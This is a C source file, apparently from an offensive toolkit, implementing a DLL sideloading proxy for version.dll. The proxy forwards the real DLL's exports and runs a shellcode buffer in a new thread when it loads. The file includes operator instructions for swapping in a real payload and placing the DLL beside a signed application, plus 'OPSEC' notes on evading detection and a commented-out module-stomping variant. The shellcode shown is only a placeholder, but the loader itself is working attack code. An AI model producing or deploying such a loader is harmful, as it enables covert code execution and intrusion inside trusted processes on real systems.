/*
 * sideload_template.c -- DLL Sideloading Proxy Template
 *
 * This template creates a proxy DLL that:
 *   1. Forwards all exports to the real DLL (loaded from System32)
 *   2. Executes shellcode when the DLL is loaded (DLL_PROCESS_ATTACH)
 *
 * Default target: version.dll
 *   - Commonly sideloaded
 *   - Small number of exports (easy to proxy)
 *   - Loaded by many applications early in startup
 *
 * OPSEC properties:
 *   - Execution triggered by a legitimate, signed binary
 *   - Parent process is the trusted host application
 *   - Proxy DLL is loaded via normal Windows loader mechanisms
 *   - All real exports continue to work (application does not crash)
 *
 * Operator instructions:
 *   1. Identify your target application and the DLL it loads (see targets.md)
 *   2. Replace the export forwarding pragmas below with the target DLL's exports
 *      Use: dumpbin /exports C:\Windows\System32\<target>.dll
 *      Or:  x86_64-w64-mingw32-objdump -p /path/to/<target>.dll | grep -A999 "Export"
 *   3. Replace the shellcode in sc[] with your payload
 *   4. Update REAL_DLL_PATH if the real DLL is not in System32
 *   5. Compile and place next to the target application
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -shared -O2 -s sideload_template.c \
 *       -o version.dll -lkernel32
 *
 * Deployment:
 *   Copy the compiled version.dll to the same directory as the target
 *   application. When the application starts, it will load your proxy DLL
 *   instead of the real version.dll from System32.
 */

#include <windows.h>

/* --------------------------------------------------------------------------
 * Configuration
 * -------------------------------------------------------------------------- */

/*
 * Path to the REAL DLL that we forward exports to.
 * The proxy loads this and resolves all real function addresses from it.
 * Using the full System32 path ensures we load the genuine Microsoft DLL
 * and not another copy of ourselves (infinite loop).
 */
#define REAL_DLL_PATH "C:\\Windows\\System32\\version.dll"

/*
 * Placeholder shellcode -- replace with your actual payload.
 * This example is a NOP sled + RET for testing (will simply return).
 */
static unsigned char sc[] = {
    0x90, 0x90, 0x90, 0x90,  /* NOP sled */
    0xC3                      /* RET */
};

/* --------------------------------------------------------------------------
 * Export Forwarding
 *
 * These pragmas tell the linker to create export entries that forward
 * calls to the real version.dll. When the host application calls
 * GetFileVersionInfoA, the call is redirected to the real DLL.
 *
 * Format: #pragma comment(linker, "/export:<name>=<real_dll>.<name>,@<ordinal>")
 *
 * The exports below are for version.dll. To proxy a different DLL:
 *   1. Run: dumpbin /exports C:\Windows\System32\<target>.dll
 *   2. Replace these pragmas with the target's exports
 *   3. Update REAL_DLL_PATH above
 *   4. Rename the output DLL to match the target
 *
 * Note: Using linker-level forwarding is cleaner than runtime forwarding
 * with GetProcAddress. The forwarding is resolved by the Windows loader
 * itself, which is more transparent and harder to detect.
 * -------------------------------------------------------------------------- */

/*
 * version.dll exports (Windows 10/11)
 *
 * These are the standard exports. Some builds may have additional exports;
 * verify against your target Windows version.
 */
#pragma comment(linker, "/export:GetFileVersionInfoA=real_version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=real_version.GetFileVersionInfoByHandle")
#pragma comment(linker, "/export:GetFileVersionInfoExA=real_version.GetFileVersionInfoExA")
#pragma comment(linker, "/export:GetFileVersionInfoExW=real_version.GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=real_version.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=real_version.GetFileVersionInfoSizeExA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=real_version.GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=real_version.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW=real_version.GetFileVersionInfoW")
#pragma comment(linker, "/export:VerFindFileA=real_version.VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW=real_version.VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA=real_version.VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW=real_version.VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=real_version.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=real_version.VerLanguageNameW")
#pragma comment(linker, "/export:VerQueryValueA=real_version.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=real_version.VerQueryValueW")

/* --------------------------------------------------------------------------
 * Global State
 * -------------------------------------------------------------------------- */

static HMODULE g_hRealDll = NULL;

/* --------------------------------------------------------------------------
 * Shellcode Execution
 *
 * Runs the shellcode in a new thread to avoid blocking DllMain.
 * DllMain runs under the loader lock, so doing heavy work there can
 * cause deadlocks. A separate thread avoids this.
 * -------------------------------------------------------------------------- */

static DWORD WINAPI execute_shellcode(LPVOID param)
{
    (void)param;

    void *exec_mem;
    DWORD old_protect;

    /*
     * Allocate RW memory, copy shellcode, then change to RX.
     * This avoids ever having a RWX region.
     */
    exec_mem = VirtualAlloc(
        NULL,
        sizeof(sc),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (exec_mem == NULL) {
        return 1;
    }

    /* Copy shellcode to allocated memory */
    memcpy(exec_mem, sc, sizeof(sc));

    /* Change to executable (RX) */
    if (!VirtualProtect(exec_mem, sizeof(sc), PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    /* Execute the shellcode */
    ((void (*)(void))exec_mem)();

    /* Cleanup (only reached if shellcode returns) */
    VirtualProtect(exec_mem, sizeof(sc), PAGE_READWRITE, &old_protect);
    SecureZeroMemory(exec_mem, sizeof(sc));
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}

/* --------------------------------------------------------------------------
 * Alternative: Module Stomping Execution
 *
 * For better OPSEC, uncomment this function and call it instead of
 * execute_shellcode. This combines sideloading with module stomping:
 * the sideloaded DLL loads ANOTHER sacrificial DLL and stomps its
 * .text section, giving you image-backed execution within a trusted
 * process tree.
 * -------------------------------------------------------------------------- */

/*
static DWORD WINAPI execute_shellcode_stomped(LPVOID param)
{
    (void)param;

    HMODULE hSacrificial = LoadLibraryExA(
        "dbghelp.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hSacrificial) return 1;

    // ... (see stomper/stomper.c for full stomping logic)

    return 0;
}
*/

/* --------------------------------------------------------------------------
 * DllMain -- Entry Point
 * -------------------------------------------------------------------------- */

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;

    HANDLE hThread;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            /*
             * Load the real version.dll from System32 so that export
             * forwarding works. We load it with the full path to avoid
             * the loader picking up our proxy DLL again.
             *
             * Note: The linker-level export forwarding (pragma comments above)
             * uses "real_version" as the DLL name. We need to ensure the real
             * DLL is loaded with that module name. One approach is to copy the
             * real DLL as "real_version.dll" next to our proxy. Alternatively,
             * use runtime forwarding (see below).
             */
            g_hRealDll = LoadLibraryA(REAL_DLL_PATH);

            if (g_hRealDll == NULL) {
                /*
                 * If we cannot load the real DLL, export forwarding will
                 * fail and the host application may crash. In a real
                 * deployment, you may want to handle this more gracefully.
                 */
                return FALSE;
            }

            /*
             * Execute shellcode in a new thread.
             * We do NOT do heavy work in DllMain because it runs under
             * the loader lock. Creating a thread is safe here.
             */
            hThread = CreateThread(
                NULL,
                0,
                execute_shellcode,
                NULL,
                0,
                NULL
            );

            if (hThread != NULL) {
                CloseHandle(hThread);  /* Don't leak the handle */
            }

            break;

        case DLL_PROCESS_DETACH:
            if (g_hRealDll != NULL) {
                FreeLibrary(g_hRealDll);
                g_hRealDll = NULL;
            }
            break;
    }

    return TRUE;
}

/* --------------------------------------------------------------------------
 * Runtime Export Forwarding (Alternative Approach)
 *
 * If linker-level forwarding does not work for your target (e.g., the
 * target DLL has exports that cannot be expressed with #pragma), you can
 * use runtime forwarding instead. Uncomment and adapt the functions below.
 *
 * Advantages:
 *   - Works with any export, including those with unusual names
 *   - Does not require knowing exports at compile time
 *
 * Disadvantages:
 *   - Each forwarded function requires a wrapper
 *   - Slightly more complex
 *   - The proxy DLL's export table differs from the real DLL's
 * -------------------------------------------------------------------------- */

/*
typedef BOOL (WINAPI *pfnGetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(
    LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    static pfnGetFileVersionInfoA pReal = NULL;
    if (!pReal) {
        pReal = (pfnGetFileVersionInfoA)GetProcAddress(
            g_hRealDll, "GetFileVersionInfoA");
    }
    return pReal(lptstrFilename, dwHandle, dwLen, lpData);
}
*/
